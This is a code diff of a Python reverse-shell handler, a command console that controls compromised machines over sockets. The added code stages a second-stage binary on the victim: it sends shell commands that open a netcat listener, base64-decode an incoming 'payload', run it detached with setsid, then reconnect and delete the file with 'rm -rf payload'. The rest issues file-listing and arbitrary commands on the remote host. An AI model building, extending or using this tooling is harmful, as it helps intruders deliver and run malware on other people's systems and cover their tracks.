@@ -1,11 +1,15 @@
-#!/usr/bin/python
-from nethelper import ServerSocket, pretty, netshell_loop
+#!/usr/bin/python3
+
+from modules.utils import pretty, listen, send_file, chk_payload
+from modules.sysinfo import SystemInfoGatherer
+from modules.nethelper import netshell_loop
 from threading import Thread
 import logging
 import socket
 import time
 import sys
 import cmd
+import os
 
 
 logging.basicConfig(level=logging.INFO)
@@ -69,19 +73,22 @@ class NetShell(cmd.Cmd):
 
     def do_ls(self, line):
         if not line:
-            pwd = pretty(self.server.send_command("pwd"))
+            path = pretty(self.server.send_command("pwd"))
             ls = pretty(self.server.send_command("ls -la"))
         else:
-            old_path = pretty(self.server.send_command("pwd"))
-            cd = pretty(self.server.send_command(f"cd {line}"))
-            if "no such file or directory" in cd.lower():
+            if line[0] == "-":
+                logging.error("um dont do that. placeholder text.")
+                return
+            ls = pretty(self.server.send_command(f"ls -la {line}"))
+            if "no such file or directory" in ls.lower():
                 logging.error("No such file or directory")
                 return
-            pwd = pretty(self.server.send_command("pwd"))
-            ls = pretty(self.server.send_command(f"ls -la"))
-            self.server.send_command(f"cd {old_path}".strip())
+            if line == "/":
+                path = "root folder"
+            else:
+                path = pretty(self.server.send_command(f"realpath {line}"))
 
-        sys.stdout.write(f"{pwd}\n{'=' * (len(pwd))}\n\n{ls}\n\n")
+        sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n\n")
 
     def do_run(self, line):
         self.output = self.server.send_command(line, wt_output=False)
@@ -105,6 +112,11 @@ class LocalShell(cmd.Cmd):
         if len(sys.argv) > 1 and sys.argv[1] == "-l":
             self.do_listen(None)
         
+        if not os.path.isfile('payload'):
+            logging.warning('Warning: Binary file "payload" is not present.')
+            chk_payload()
+
+        
     def emptyline(self):
         """Called when an empty line is entered in response to the prompt.
 
@@ -124,34 +136,26 @@ class LocalShell(cmd.Cmd):
     """
 
     def do_listen(self, line):
-        if not line:
-            host, port = ("localhost", 4242)
-        else:
-            host, port = line.strip().split(" ")
+        sock = listen(line, 0)
+        sock.sysinfo = SystemInfoGatherer()
+        sock.sysinfo.binaryGatherer(sock)
 
-        sock = ServerSocket()
-
-        try:
-            sock.server_socket.bind((host, int(port)))
-        except socket.error:
-            logging.error("Address already in use")
+        if not sock:
             return
         
-        logging.info(f"Started listener on {host, port}")
-
-        try:
-            sock.listen()
-            if sock.is_shell():
-                logging.error("No shell found")
-                return
-        except KeyboardInterrupt:
+        if sock.sysinfo.is_python3:
+            logging.info(f"Sending payload..")
+            sock.client_socket.send(b"touch payload\n")
+            sock.client_socket.send(b"chmod +x payload\n")
+            sock.client_socket.send(b"setsid sh -c 'nc -l 1234 | base64 -d > payload && sleep 5 && ./payload'\n")
             sock.server_socket.close()
-            print("")
-            return
-        except BrokenPipeError:
-            sock.server_socket.close()
-            logging.error("BrokenPipeError")
-            return
+            sock.client_socket.close()
+            send_file("payload", "localhost", 1234)
+            logging.info(f"Payload sent. Starting listener..")
+            sock = listen(line, 1)
+            sock.client_socket.send(b"rm -rf payload\n")
+        else:
+            logging.error("python was not found. Using shell as client.")
 
         self.currentSession = NetShell(sock)
 
